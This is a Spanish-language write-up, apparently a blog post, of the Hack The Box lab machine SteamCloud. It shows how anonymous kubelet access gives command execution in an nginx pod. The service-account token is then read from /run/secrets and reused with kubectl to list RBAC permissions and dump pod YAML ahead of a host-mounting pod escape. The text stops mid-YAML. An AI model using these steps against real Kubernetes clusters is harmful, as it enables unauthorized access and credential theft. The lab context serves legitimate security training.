---
layout: post
title:  "Maquina Retirada SteamCloud de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada STEAMCLOUD.
tags: HTB, Kubernetes, RCE, Misconfigurations, Malicius Pods/Container.
---

# SteamCloud ~ Hack The Box ~ 

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.133       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2022-02-14T22:41:11
|_Not valid after:  2023-02-14T22:41:11
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2022-02-14T22:41:11
|_Not valid after:  2023-02-14T22:41:12
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: d26a87e5-e803-43c5-bb05-83491b15c124
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 608dea06-2a35-4053-a494-fc3e243fb1d6
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3faf9dc0-ffc4-4c00-a461-1cf53b47030e
|     Date: Tue, 15 Feb 2022 18:39:37 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: a0619f00-d9d1-427a-8826-86ea39143092
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 608dea06-2a35-4053-a494-fc3e243fb1d6
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3faf9dc0-ffc4-4c00-a461-1cf53b47030e
|     Date: Tue, 15 Feb 2022 18:39:36 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: f7a4fd6b-8166-42e5-9cad-dd2acc308247
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 608dea06-2a35-4053-a494-fc3e243fb1d6
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3faf9dc0-ffc4-4c00-a461-1cf53b47030e
|     Date: Tue, 15 Feb 2022 18:39:37 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2022-02-13T22:41:08
|_Not valid after:  2025-02-13T22:41:08
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=steamcloud@1644878477
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2022-02-14T21:41:16
|_Not valid after:  2023-02-14T21:41:16
|_ssl-date: TLS randomness does not represent time
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=2/15%Time=620BEF4B%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20a0619
SF:f00-d9d1-427a-8826-86ea39143092\r\nCache-Control:\x20no-cache,\x20priva
SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20608dea06-2a35-4053-a494-fc
SF:3e243fb1d6\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x203faf9dc0-ffc4-4c00-
SF:a461-1cf53b47030e\r\nDate:\x20Tue,\x2015\x20Feb\x202022\x2018:39:36\x20
SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\
SF:":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden
SF::\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/
SF:\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTP
SF:Options,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20f7a4fd6b-816
SF:6-42e5-9cad-dd2acc308247\r\nCache-Control:\x20no-cache,\x20private\r\nC
SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x20608dea06-2a35-4053-a494-fc3e243fb
SF:1d6\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x203faf9dc0-ffc4-4c00-a461-1c
SF:f53b47030e\r\nDate:\x20Tue,\x2015\x20Feb\x202022\x2018:39:37\x20GMT\r\n
SF:Content-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\
SF:",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20Us
SF:er\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\\
SF:"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhF
SF:ourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20d26a87e5-
SF:e803-43c5-bb05-83491b15c124\r\nCache-Control:\x20no-cache,\x20private\r
SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20608dea06-2a35-4053-a494-fc3e24
SF:3fb1d6\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x203faf9dc0-ffc4-4c00-a461
SF:-1cf53b47030e\r\nDate:\x20Tue,\x2015\x20Feb\x202022\x2018:39:37\x20GMT\
SF:r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"
SF:v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x2
SF:0User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice
SF:\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 15 19:23:39 2022 -- 1 IP address (1 host up) scanned in 108.88 seconds
```

Vemos por los puertos abiertos que estamos ante Kubernetes
Procedemos a usar dos herramientas para ello

# Kubectl & Kubeletctl

Procedemos a listar los "Pods" existentes con Kubeletctl
```bash
# kubeletctl -s 10.10.11.133 pods                                                                                        1 ⚙
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```


```bash
# Para listar si tenemos ejecucion remota de comandos en algun pod/ container 
# kubeletctl -s 10.10.11.133 scan rce                             130 ⨯ 1 ⚙
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.10.11.133 │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │              │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │              │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```
Accediendo al contenedor
```bash
# rlwrap kubeletctl -s 10.10.11.133 -p nginx -c nginx exec bash 
root@nginx:/# cat /root/user.txt
3x7bxxxx245fc708b1xxxxxxxxxxxxxx
```

# Escalada de Privilegios
KUBERNETES TOKENS → cuando tenemos RCE en algun Pod 
https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration


```bash
# kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "ls -l /run/secrets/kubernetes.io/serviceaccount"                             
total 0
lrwxrwxrwx 1 root root 13 Apr  4 12:31 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root 16 Apr  4 12:31 namespace -> ..data/namespace
lrwxrwxrwx 1 root root 12 Apr  4 12:31 token -> ..data/token

# kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" > content/ca.crt
# kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "cat /run/secrets/kubernetes.io/serviceaccount/namespace" > content/namespace
# kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "cat /run/secrets/kubernetes.io/serviceaccount/token" > content/token
```
Procedemos a intentar authenticarnos con estos tres recursos de la siguiente forma usando Kubectl

```bash
# Conectandonos con Kubectl siguiendo los pasos proporcionando ca.crt y token

# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' get pods
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          28m
```
Vemos que funciona y aqui procedemos a intentar insertar el parametro "auth"

```bash
# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' auth    
Inspect authorization

Available Commands:
  can-i       Check whether an action is allowed
  reconcile   Reconciles rules for RBAC role, role binding, cluster role, and cluster role binding objects
```

```bash
# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' auth can-i --list --namespace=nginx
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

```bash
# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' auth can-i --list                  
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get "create" list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

Procedemos de la siguiente forma
```bash
# Privesc creando un pod kubernetes
# Creando un pod/ contenedor para montar todo el sistema victima en el directorio /mnt del pod que vamos a crear

# kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' get pods nginx -o yaml > pod.yaml
```

Procedemos a leer el archivo guardado en formato yaml 
```bash
# cat pod.yaml 

apiVersion: v1                                                                                                                                                                                                     
metadata:                                                                                                                                                                                                          
  annotations:                                                                                                                                                                                                     
    kubectl.kubernetes.io/last-applied-configuration: |                                                                                                                                                            
      {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"nginx","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.2","imagePullPolicy":"Never","name":"nginx","volumeMounts":[{"m
ountPath":"/root","name":"flag"}]}],"volumes":[{"hostPath":{"path":"/opt/flag"},"name":"flag"}]}}                                                                                                                  
  creationTimestamp: "2022-04-04T12:31:02Z"                                                                                                                                                                        
  name: nginx                                                                                                                                                                                                      
  namespace: default                                                                                                                                                                                               
  resourceVersion: "514"                                                                                                                                                                                           
  uid: ef1ce363-54c9-4404-a870-331df0966b4f                                                                                                                                                                        
spec:                                                                                                                                                                                                              
  containers:                                                                                                                                                                                                      
  - image: nginx:1.14.2                                                                                                                                                                                            
    imagePullPolicy: Never                                                                                                                                                                                         
    name: nginx                                                                                                                                                                                                    
    resources: {}                                                                                                                                                                                                  
    terminationMessagePath: /dev/termination-log                                                                                                                                                                   
    terminationMessagePolicy: File                                                                                                                                                                                 
    volumeMounts:                                                                                                                                                                                                  
    - mountPath: /root                                                                                                                                                                                             
      name: flag                                                                                                                                                                                                   
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount                                                                                                                                                     
      name: kube-api-access-xdscg                                                                                                                                                                                  
      readOnly: true                                                                                                                                                                                               
  dnsPolicy: ClusterFirst                                                                                                                                                                                          
  enableServiceLinks: true                                                                                                                                                                                         
  nodeName: steamcloud                                                                                                                                                                                             
  preemptionPolicy: PreemptLowerPriority                                                                                                                                                                           
  priority: 0                                                                                                                                                                                                      
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: default
  serviceAccountName: default
  terminationGracePeriodSeconds: 30
  tolerations:                                                                                                                                                                                                     
  - effect: NoExecute                                                                                                                                                                                              
    key: node.kubernetes.io/not-ready                                                                                                                                                                              
    operator: Exists                                                                                                                                                                                               
    tolerationSeconds: 300                                                                                                                                                                                         
  - effect: NoExecute                                                                                                                                                                                              
    key: node.kubernetes.io/unreachable                                                                                                                                                                            
    operator: Exists                                                                                                                                                                                               
    tolerationSeconds: 300                                                                                                                                                                                         
  volumes:                                                                                                                                                                                                         
  - hostPath:                                                                                                                                                                                                      
      path: /opt/flag                                                                                                                                                                                              
      type: ""                                                                                                                                                                                                     
    name: flag                                                                                                                                                                                                     
  - name: kube-api-access-xdscg                                                                                                                                                                                    
    projected:                                                                                                                                                                                                     
      defaultMode: 420                                                                                                                                                                                             
      sources:                                                                                                                                                                                                     
      - serviceAccountToken:                                                                                                                                                                                       
          expirationSeconds: 3607 
    path: token                                                                                                                                                                                      [0/1525]
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2022-04-04T12:31:02Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2022-04-04T12:31:04Z"
    status: "True"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2022-04-04T12:31:04Z"
    status: "True"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2022-04-04T12:31:02Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: docker://f52ba68de2041b33f93bb3b11c30408cbee6d02ce1b2b1e9548abb04c3770a8d
    image: nginx:1.14.2
    imageID: docker-pullable://nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d
    lastState: {}
    name: nginx
    ready: true
    restartCount: 0
    started: true
    state:
      running:
